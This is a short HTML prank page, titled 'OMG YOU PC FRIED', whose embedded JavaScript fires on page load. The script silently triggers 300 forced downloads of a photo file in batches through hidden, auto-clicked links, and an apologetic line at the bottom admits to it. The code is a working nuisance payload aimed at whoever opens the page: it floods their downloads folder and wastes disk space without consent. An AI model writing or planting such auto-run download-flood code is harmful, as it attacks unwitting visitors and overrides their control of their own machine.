<!DOCTYPE html>
<html lang="en">
<head>

  <title>OMG YOU PC FRIED</title>

<body>
  <script>
    const totalCopies = 300;
    const batchSize = 100;
    let current = 1;

    function downloadBatch() {
      for (let i = 0; i < batchSize && current <= totalCopies; i++, current++) {
        const link = document.createElement('a');
        link.href = 'WIN_20251109_17_45_22_Pro.jpg';
        link.download = `photo${current}.jpg`;
        link.style.display = 'none';
        document.body.appendChild(link);
        link.click();
        link.remove();
      }
      if (current <= totalCopies) {
        setTimeout(downloadBatch, 500); // Wait 500ms before next batch
      } else {
        console.log('All downloads triggered!');
      }
    }

    document.addEventListener("DOMContentLoaded", function() {
      downloadBatch();
    });
  </script>

  <p>Attempting to download 300 copies automatically. :D sorry :( :) </p>
</body>
